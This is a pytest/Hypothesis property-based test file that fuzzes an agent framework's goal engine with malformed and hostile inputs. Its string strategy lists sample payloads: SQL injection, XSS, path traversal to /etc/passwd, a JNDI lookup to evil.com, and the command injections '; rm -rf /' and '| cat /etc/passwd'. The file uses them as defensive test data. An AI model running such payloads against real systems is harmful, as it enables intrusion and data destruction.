"""Property-based tests for input validation across X-Agent.

These tests ensure that the system handles various malformed,
malicious, and edge-case inputs gracefully without crashing.
"""

import pytest
from hypothesis import given, strategies as st, settings, HealthCheck, assume
import json

from xagent.core.goal_engine import GoalEngine, GoalMode, GoalStatus


# Strategies for potentially malicious or malformed inputs
@st.composite
def potentially_dangerous_strings(draw):
    """Generate strings that might break parsers or cause issues."""
    return draw(
        st.one_of(
            # SQL injection attempts
            st.just("'; DROP TABLE goals; --"),
            st.just("' OR '1'='1"),
            # XSS attempts
            st.just("<script>alert('xss')</script>"),
            st.just("javascript:alert(1)"),
            # Path traversal
            st.just("../../etc/passwd"),
            st.just("..\\..\\windows\\system32"),
            # Null bytes
            st.just("test\x00data"),
            # Very long strings (reasonable size for Hypothesis)
            st.text(min_size=5000, max_size=8000),
            # Unicode edge cases
            st.just("��"),  # Invalid UTF-8
            st.just("零一二三四五六七八九"),  # Chinese numbers
            st.just("🎉🎊🎈🎁"),  # Emojis
            # Format string attacks
            st.just("%s%s%s%s%s"),
            st.just("${jndi:ldap://evil.com/a}"),
            # Command injection attempts
            st.just("; rm -rf /"),
            st.just("| cat /etc/passwd"),
            # JSON bombs (reduced size)
            st.just('{"a":' * 100 + '"b"' + '}' * 100),
            # Normal problematic strings
            st.just(""),
            st.just(" "),
            st.just("\n\n\n"),
            st.just("\t\t\t"),
            st.text(alphabet=st.characters(blacklist_categories=("Cs", "Cc")), min_size=0, max_size=1000),
        )
    )


@st.composite
def extreme_integers(draw):
    """Generate extreme integer values."""
    return draw(
        st.one_of(
            st.just(0),
            st.just(-1),
            st.just(2**31 - 1),  # Max 32-bit int
            st.just(-(2**31)),  # Min 32-bit int
            st.just(2**63 - 1),  # Max 64-bit int
            st.just(-(2**63)),  # Min 64-bit int
            st.just(10**100),  # Very large
            st.integers(min_value=-10**6, max_value=10**6),
        )
    )


@st.composite
def malformed_json_strings(draw):
    """Generate strings that look like JSON but are malformed."""
    return draw(
        st.one_of(
            st.just("{"),
            st.just("}"),
            st.just('{"key": }'),
            st.just('{"key": "value"'),  # Missing closing brace
            st.just('{"key": "value",}'),  # Trailing comma
            st.just('[1, 2, 3,]'),
            st.just('{"a": {"b": {"c": }}}'),
            st.just('null'),
            st.just('undefined'),
        )
    )


class TestGoalEngineInputValidation:
    """Property-based tests for Goal Engine input validation."""

    @given(description=potentially_dangerous_strings())
    @settings(max_examples=500, suppress_health_check=[HealthCheck.too_slow])
    def test_goal_description_handles_dangerous_strings(self, description):
        """Property: Goal engine handles potentially dangerous descriptions safely."""
        engine = GoalEngine()
        
        try:
            # Should not crash or execute any malicious code
            goal = engine.create_goal(description=description)
            
            # Goal should be created successfully
            assert goal is not None
            assert goal.id is not None
            assert goal.description == description
            
            # Should be retrievable
            retrieved = engine.get_goal(goal.id)
            assert retrieved is not None
            assert retrieved.description == description
            
        except Exception as e:
            # Should handle gracefully, not crash with unhandled exceptions
            pytest.fail(f"Goal engine crashed with dangerous string: {e}")

    @given(priority=extreme_integers())
    @settings(max_examples=500)
    def test_goal_priority_handles_extreme_values(self, priority):
        """Property: Goal engine handles extreme priority values."""
        engine = GoalEngine()
        
        try:
            goal = engine.create_goal(
                description="Test goal",
                priority=priority,
            )
            
            assert goal is not None
            assert goal.priority == priority
            
            # Should be storable and retrievable
            retrieved = engine.get_goal(goal.id)
            assert retrieved is not None
            assert retrieved.priority == priority
            
        except (ValueError, OverflowError, TypeError) as e:
            # These are acceptable for truly extreme values
            pass
        except Exception as e:
            pytest.fail(f"Unexpected error with priority {priority}: {e}")

    @given(
        description=potentially_dangerous_strings(),
        criteria=st.lists(potentially_dangerous_strings(), min_size=0, max_size=10),
    )
    @settings(max_examples=500)
    def test_completion_criteria_handles_dangerous_strings(self, description, criteria):
        """Property: Completion criteria handles potentially dangerous strings."""
        engine = GoalEngine()
        
        try:
            goal = engine.create_goal(
                description=description,
                completion_criteria=criteria,
            )
            
            assert goal is not None
            assert goal.completion_criteria == criteria
            
            # Verify it's retrievable and unchanged
            retrieved = engine.get_goal(goal.id)
            assert retrieved is not None
            assert retrieved.completion_criteria == criteria
            
        except Exception as e:
            pytest.fail(f"Failed with dangerous completion criteria: {e}")

    @given(
        metadata_keys=st.lists(potentially_dangerous_strings(), min_size=0, max_size=10),
        metadata_values=st.lists(
            st.one_of(
                potentially_dangerous_strings(),
                extreme_integers(),
                st.booleans(),
                st.none(),
            ),
            min_size=0,
            max_size=10,
        ),
    )
    @settings(max_examples=300)
    def test_metadata_handles_dangerous_content(self, metadata_keys, metadata_values):
        """Property: Goal metadata handles potentially dangerous content."""
        engine = GoalEngine()
        
        # Ensure equal lengths
        min_len = min(len(metadata_keys), len(metadata_values))
        metadata = dict(zip(metadata_keys[:min_len], metadata_values[:min_len]))
        
        try:
            goal = engine.create_goal(
                description="Test goal",
                metadata=metadata,
            )
            
            assert goal is not None
            # Metadata should be stored (may be filtered/sanitized)
            assert isinstance(goal.metadata, dict)
            
            # Should be retrievable
            retrieved = engine.get_goal(goal.id)
            assert retrieved is not None
            
        except Exception as e:
            # Should handle gracefully
            pytest.fail(f"Failed with dangerous metadata: {e}")

    @given(goal_id=potentially_dangerous_strings())
    @settings(max_examples=500)
    def test_get_goal_handles_dangerous_ids(self, goal_id):
        """Property: get_goal handles potentially dangerous IDs without crashing."""
        engine = GoalEngine()
        
        try:
            # Should return None for non-existent/invalid IDs, not crash
            result = engine.get_goal(goal_id)
            assert result is None
            
        except Exception as e:
            pytest.fail(f"get_goal crashed with ID '{goal_id}': {e}")

    @given(
        goal_id=potentially_dangerous_strings(),
        new_status=st.sampled_from(GoalStatus),
    )
    @settings(max_examples=500)
    def test_update_goal_status_handles_dangerous_ids(self, goal_id, new_status):
        """Property: update_goal_status handles potentially dangerous IDs without crashing."""
        engine = GoalEngine()
        
        try:
            # Should handle gracefully for non-existent/invalid IDs, not crash
            engine.update_goal_status(goal_id, new_status)
            # No assertion needed - just shouldn't crash
            
        except (KeyError, ValueError):
            # These are acceptable for invalid IDs
            pass
        except Exception as e:
            pytest.fail(f"update_goal_status crashed with ID '{goal_id}': {e}")

    @given(
        parent_id=st.one_of(
            potentially_dangerous_strings(),
            st.none(),
        )
    )
    @settings(max_examples=500)
    def test_parent_id_handles_dangerous_values(self, parent_id):
        """Property: Parent ID field handles dangerous values."""
        engine = GoalEngine()
        
        try:
            goal = engine.create_goal(
                description="Child goal",
                parent_id=parent_id,
            )
            
            assert goal is not None
            assert goal.parent_id == parent_id
            
        except Exception as e:
            # Should handle gracefully
            pytest.fail(f"Failed with parent_id '{parent_id}': {e}")


class TestJSONSerializationRobustness:
    """Property-based tests for JSON serialization safety."""

    @given(
        description=potentially_dangerous_strings(),
        metadata=st.dictionaries(
            keys=st.text(min_size=1, max_size=100),
            values=st.one_of(
                st.text(),
                st.integers(),
                st.floats(allow_nan=False, allow_infinity=False),
                st.booleans(),
                st.none(),
            ),
            min_size=0,
            max_size=20,
        ),
    )
    @settings(max_examples=500)
    def test_goal_to_dict_produces_serializable_output(self, description, metadata):
        """Property: Goal.to_dict() always produces JSON-serializable output."""
        engine = GoalEngine()
        
        goal = engine.create_goal(
            description=description,
            metadata=metadata,
        )
        
        try:
            # Convert to dict
            goal_dict = goal.to_dict()
            
            # Should be JSON serializable
            json_str = json.dumps(goal_dict)
            
            # Should be reversible
            reconstructed = json.loads(json_str)
            
            assert isinstance(reconstructed, dict)
            assert "id" in reconstructed
            assert "description" in reconstructed
            
        except (TypeError, ValueError) as e:
            pytest.fail(f"Goal dict is not JSON serializable: {e}")


class TestConcurrentAccessRobustness:
    """Property-based tests for concurrent access patterns."""

    @given(
        num_concurrent_creates=st.integers(min_value=1, max_value=50),
    )
    @settings(max_examples=100)
    def test_many_concurrent_creates_maintain_consistency(self, num_concurrent_creates):
        """Property: Many concurrent creates maintain data consistency."""
        engine = GoalEngine()
        
        # Simulate concurrent creates
        created_goals = []
        for i in range(num_concurrent_creates):
            goal = engine.create_goal(description=f"Concurrent goal {i}")
            created_goals.append(goal)
        
        # All goals should be unique and retrievable
        goal_ids = [g.id for g in created_goals]
        assert len(goal_ids) == len(set(goal_ids)), "Goal IDs must be unique"
        
        # All should be in engine
        for goal in created_goals:
            retrieved = engine.get_goal(goal.id)
            assert retrieved is not None
            assert retrieved.id == goal.id

    @given(
        operations=st.lists(
            st.tuples(
                st.sampled_from(["create", "read", "update"]),
                st.text(min_size=1, max_size=100),
            ),
            min_size=10,
            max_size=100,
        )
    )
    @settings(max_examples=100)
    def test_mixed_operations_maintain_consistency(self, operations):
        """Property: Mixed operations maintain engine consistency."""
        engine = GoalEngine()
        created_ids = []
        
        for op, data in operations:
            try:
                if op == "create":
                    goal = engine.create_goal(description=data)
                    created_ids.append(goal.id)
                    
                elif op == "read" and created_ids:
                    goal_id = created_ids[len(created_ids) // 2]
                    engine.get_goal(goal_id)
                    
                elif op == "update" and created_ids:
                    goal_id = created_ids[len(created_ids) // 2]
                    engine.update_goal_status(goal_id, GoalStatus.IN_PROGRESS)
                    
            except Exception as e:
                pytest.fail(f"Operation {op} failed: {e}")
        
        # Engine should be in consistent state
        all_goals = engine.list_goals()
        assert isinstance(all_goals, list)
        assert len(all_goals) == len(created_ids)


class TestBoundaryConditions:
    """Property-based tests for boundary conditions."""

    @given(
        description=st.text(min_size=0, max_size=0),  # Empty string
    )
    @settings(max_examples=100)
    def test_empty_description_handling(self, description):
        """Property: System handles empty descriptions appropriately."""
        engine = GoalEngine()
        
        # Empty descriptions might be rejected or accepted depending on policy
        # The important thing is consistent, non-crashing behavior
        try:
            goal = engine.create_goal(description=description)
            assert goal is not None
            assert goal.description == description
        except ValueError:
            # Acceptable to reject empty descriptions
            pass

    @given(
        list_size=st.integers(min_value=0, max_value=1000),
    )
    @settings(max_examples=100)
    def test_very_large_lists_handling(self, list_size):
        """Property: System handles very large lists in fields."""
        engine = GoalEngine()
        
        large_list = [f"Item {i}" for i in range(list_size)]
        
        try:
            goal = engine.create_goal(
                description="Test goal",
                completion_criteria=large_list[:100],  # Reasonable limit
            )
            
            assert goal is not None
            
        except Exception as e:
            # System might impose limits, that's ok
            if "too large" in str(e).lower() or "limit" in str(e).lower():
                pass
            else:
                pytest.fail(f"Unexpected error with large list: {e}")


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--hypothesis-show-statistics"])
